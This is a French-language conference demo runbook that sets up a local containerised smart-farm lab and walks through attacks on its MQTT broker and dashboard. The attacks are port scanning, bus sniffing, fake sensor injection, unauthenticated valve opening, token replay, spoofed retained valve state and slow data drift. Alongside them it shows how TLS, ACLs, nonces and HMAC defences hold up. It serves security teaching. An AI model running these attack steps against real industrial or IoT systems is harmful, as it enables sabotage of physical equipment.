# Démo GDG Lomé 2026 — commandes, une par une

Runbook autonome : **chaque commande est écrite en entier**, sans script `.sh`
et sans alias (`run`/`atk`). À exécuter depuis `gdg_lome/2026/demos`. Sous chaque
commande, la ligne de résultat attendue (valeurs d'une exécution réelle).

Convention : `$` = invite du shell. Ne pas taper le `$`.

---

## 0. Préparation (une seule fois, avec Internet)

### 0.1 Fichiers de configuration (déjà dans le dépôt)

| Fichier | Rôle |
|---|---|
| `compose.yaml` | les 4 services ; lit `FARM_MODE` depuis `.env` |
| `.env` | mode, token, clés, mots de passe (créé ci-dessous) |
| `mosquitto/insecure.conf` · `secure.conf` | broker anonyme sur 1883 |
| `mosquitto/hardened.conf` | TLS 8883, comptes, ACL |
| `mosquitto/acl` | droits par identité et par topic |

### 0.2 Créer le `.env`

```bash
cp .env.example .env
```

Puis générer les secrets et les écrire dans `.env` (clé HMAC + 2 mots de passe MQTT) :

```bash
printf 'CMD_HMAC_KEY=%s\n' "$(openssl rand -hex 24)" >> .env
printf 'MQTT_PASS_SIMULATOR=%s\n' "$(openssl rand -hex 24)" >> .env
printf 'MQTT_PASS_DASHBOARD=%s\n' "$(openssl rand -hex 24)" >> .env
```

> Les variables déjà présentes mais vides dans `.env.example` (`CMD_HMAC_KEY=`,
> `MQTT_PASS_SIMULATOR=`, `MQTT_PASS_DASHBOARD=`) peuvent être supprimées, ou
> laissées : la dernière valeur écrite dans `.env` gagne.

### 0.3 PKI de démo (CA + certificat du broker) — pour le mode hardened

```bash
mkdir -p mosquitto/tls/ca mosquitto/tls/server mosquitto/tls/public mosquitto/secrets
```

Autorité de certification locale :

```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 365 -sha256 \
  -subj "/CN=GDG Lome Farm Lab CA" \
  -keyout mosquitto/tls/ca/ca.key -out mosquitto/tls/ca/ca.crt
```

Certificat du broker, signé par la CA, avec les bons noms (SAN) :

```bash
openssl req -newkey rsa:2048 -nodes -sha256 -subj "/CN=mosquitto" \
  -keyout mosquitto/tls/server/server.key -out /tmp/server.csr

printf 'subjectAltName=DNS:mosquitto,DNS:localhost,IP:127.0.0.1\nextendedKeyUsage=serverAuth\n' > /tmp/ext.cnf

openssl x509 -req -in /tmp/server.csr -days 365 -sha256 \
  -CA mosquitto/tls/ca/ca.crt -CAkey mosquitto/tls/ca/ca.key -CAcreateserial \
  -extfile /tmp/ext.cnf -out mosquitto/tls/server/server.crt
```

Distribuer la CA aux conteneurs (le broker la monte, les clients la vérifient) :

```bash
cp mosquitto/tls/ca/ca.crt mosquitto/tls/server/ca.crt
cp mosquitto/tls/ca/ca.crt mosquitto/tls/public/ca.crt
chmod 644 mosquitto/tls/server/server.key
rm -f /tmp/server.csr /tmp/ext.cnf mosquitto/tls/ca/ca.srl
```

### 0.4 Comptes MQTT du mode hardened

Charger les variables du `.env` dans le shell courant, puis créer le fichier de
mots de passe avec `mosquitto_passwd` (via l'image Mosquitto, rien à installer) :

```bash
set -a; . ./.env; set +a

docker run --rm -v "$PWD/mosquitto/secrets:/work" eclipse-mosquitto:2 sh -c "
  rm -f /work/passwd && touch /work/passwd &&
  mosquitto_passwd -b /work/passwd simulator   '$MQTT_PASS_SIMULATOR' &&
  mosquitto_passwd -b /work/passwd dashboard   '$MQTT_PASS_DASHBOARD' &&
  mosquitto_passwd -b /work/passwd viewer      '$LEAK_VIEWER_PASS' &&
  mosquitto_passwd -b /work/passwd maintenance '$LEAK_MAINTENANCE_PASS' &&
  mosquitto_passwd -b /work/passwd sensor-02   '$LEAK_SENSOR02_PASS' &&
  chmod 644 /work/passwd"
```

### 0.5 Construire les images

```bash
docker compose --profile attack build
```

---

## 1. Démarrer la ferme (mode insecure)

```bash
docker compose up -d --force-recreate
```

Vérifier l'état (score proche de 100, mode insecure) :

```bash
curl -s http://127.0.0.1:8080/api/state
```
Attendu : `"mode":"insecure"`, `"valve":"CLOSED"`, `"score"` proche de `95`.

Ouvrir le tableau de bord dans le navigateur : <http://127.0.0.1:8080>

Fenêtre « ferme » (laisser tourner dans un second terminal) :

```bash
docker compose logs -f --tail 0 simulator dashboard
```

---

## 2. Acte 1 — Reconnaissance (insecure)

Scanner les ports et lire les versions :

```bash
docker compose run --rm attacker nmap -sV -p 1883,8883,8080 mosquitto dashboard
```
Attendu : `1883/tcp open mosquitto version 2.1.4`, `8080/tcp open http Werkzeug httpd 3.1.9`.

Écouter tout le bus MQTT pendant 6 s (broker anonyme) :

```bash
docker compose run --rm attacker mosquitto_sub -h mosquitto -t '#' -v -W 6
```
Attendu : défilement de `farm/sensor/humidity`, `.../temperature`, `.../flow`, `farm/actuator/valve/state`.

---

## 3. Acte 2 — Mentir et agir (insecure)

Injecter 15 fausses mesures d'humidité à 0 :

```bash
docker compose run --rm attacker python attack.py flood --value 0 --count 15
```
Attendu : `[flood] 15 mesures humidité=0.0 — broker : accepté`.

Ouvrir la vanne sans aucune authentification :

```bash
curl -i -X POST http://127.0.0.1:8080/api/valve/open
```
Attendu : `HTTP/1.1 200 OK`, `{"command":"OPEN",...,"mode":"insecure"}`.

Lire l'impact (vanne ouverte, débit, score, FCFA) :

```bash
docker compose run --rm attacker python attack.py state
```
Attendu : `vanne=OPEN débit≈34 L/min score=0 impact≈2 000 000 FCFA`.

---

## 4. Passer en défense naïve (mode secure)

Recréer la pile en mode secure (le `FARM_MODE` inline suffit, aucun script) :

```bash
FARM_MODE=secure docker compose up -d --force-recreate
```

Confirmer le mode :

```bash
curl -s http://127.0.0.1:8080/api/state
```
Attendu : `"mode":"secure"`.

> Les commandes `docker compose run attacker ...` qui suivent ne changent plus le
> mode (le service `attacker` ne dépend d'aucun autre). Le mode ne change qu'avec
> un nouveau `docker compose up` portant un `FARM_MODE` différent.

### 4.1 Les contrôles marchent

Fausse humidité rejetée :

```bash
docker compose run --rm attacker python attack.py flood --value 0 --count 15
```
Attendu côté ferme (journal du dashboard) : `humidité 0.0 REJETÉE : hors plage [20, 100]`.

Vanne refusée sans token :

```bash
curl -i -X POST http://127.0.0.1:8080/api/valve/open
```
Attendu : `HTTP/1.1 403 FORBIDDEN`, `{"error":"token requis"}`.

### 4.2 Contournement : voler le token sur le bus et le rejouer

```bash
docker compose run --rm attacker python attack.py replay --simulate-operator --close-first
```
Attendu : `commande capturée : {"command": "OPEN", "token": "gdg-demo-token"}` puis
`rejeu ... — broker : accepté`. Dans la fenêtre ferme : `valve -> OPEN` après la fermeture.

### 4.3 Contournement : rendre l'opérateur aveugle (faux état retenu)

```bash
docker compose run --rm attacker mosquitto_pub -h mosquitto -t farm/actuator/valve/state -r -m CLOSED
```
Attendu : le dashboard affiche `Vanne : CLOSED` alors que le débitmètre indique ~33 L/min.

### 4.4 Contournement : empoisonner dans la plage valide

```bash
docker compose run --rm attacker python attack.py flood --value 25 --count 30
```
```bash
docker compose run --rm attacker python attack.py state
```
Attendu : `mode=secure vanne=CLOSED score≈21 impact≈1 500 000 FCFA`, aucune trace du rejeu dans le journal.

---

## 5. Passer en défense en profondeur (mode hardened)

```bash
FARM_MODE=hardened docker compose up -d --force-recreate
```
```bash
curl -s http://127.0.0.1:8080/api/state
```
Attendu : `"mode":"hardened"`.

### 5.1 Accès anonyme refusé (TLS + comptes)

```bash
docker compose run --rm attacker python attack.py anon
```
Attendu : `1883 ... connexion impossible (Connection refused)` et `8883 ... REFUSÉ par le broker (Not authorized)`.

### 5.2 ACL : un compte volé lit peu et n'écrit pas

Lecture limitée aux capteurs (identité « viewer » fuitée) :

```bash
docker compose run --rm attacker python attack.py sniff --as viewer --topic 'farm/#' --seconds 4
```
Attendu : seuls des messages `farm/sensor/*` apparaissent.

Écriture refusée par l'ACL :

```bash
docker compose run --rm attacker python attack.py flood --as viewer --value 0 --count 2
```
Attendu : `broker : REFUSÉ (Not authorized)`.

Faux état de vanne refusé (identité « sensor-02 ») :

```bash
docker compose run --rm attacker python attack.py spoof-state --as sensor-02 --state CLOSED
```
Attendu : `broker : REFUSÉ (Not authorized)`.

### 5.3 Rejeu bloqué par le nonce (identité « maintenance », qui a le droit vanne)

```bash
docker compose run --rm attacker python attack.py replay --as maintenance --simulate-operator --close-first
```
```bash
docker compose run --rm attacker python attack.py state
```
Attendu dans le journal : `commande OPEN REJETÉE : rejeu détecté (nonce déjà utilisé)`.

### 5.4 Commande forgée sans la clé HMAC

```bash
docker compose run --rm attacker python attack.py forge --as maintenance
```
Attendu (journal / logs simulateur) : `commande OPEN REJETÉE : signature HMAC invalide`.

### 5.5 La limite : la dérive lente

Saut brutal détecté :

```bash
docker compose run --rm attacker python attack.py flood --as sensor-02 --value 25 --count 10
```
Attendu : `humidité 25.0 REJETÉE : saut anormal (...)`.

Dérive lente sous le seuil :

```bash
docker compose run --rm attacker python attack.py drift --as sensor-02
```
```bash
docker compose run --rm attacker python attack.py state
```
Attendu : `score≈25` ; à la fin le détecteur rejette même le capteur honnête (65 → « saut anormal »).
Message : la sécurité OT est une course, pas une case à cocher.

---

## 6. Remise à zéro et suppression

Revenir en insecure pour une nouvelle démo :

```bash
FARM_MODE=insecure docker compose up -d --force-recreate
```

Arrêter (garde les images et les secrets) :

```bash
docker compose down
```

Tout supprimer — conteneurs, réseau, images et secrets locaux (machine prêtée/partagée) :

```bash
docker compose --profile attack down --rmi local --remove-orphans
rm -rf mosquitto/tls mosquitto/secrets .env
```

---

## Aide-mémoire des modes

| Mode | Commande de bascule |
|---|---|
| insecure | `FARM_MODE=insecure docker compose up -d --force-recreate` |
| secure | `FARM_MODE=secure docker compose up -d --force-recreate` |
| hardened | `FARM_MODE=hardened docker compose up -d --force-recreate` |

Vérifier à tout moment : `curl -s http://127.0.0.1:8080/api/state`.
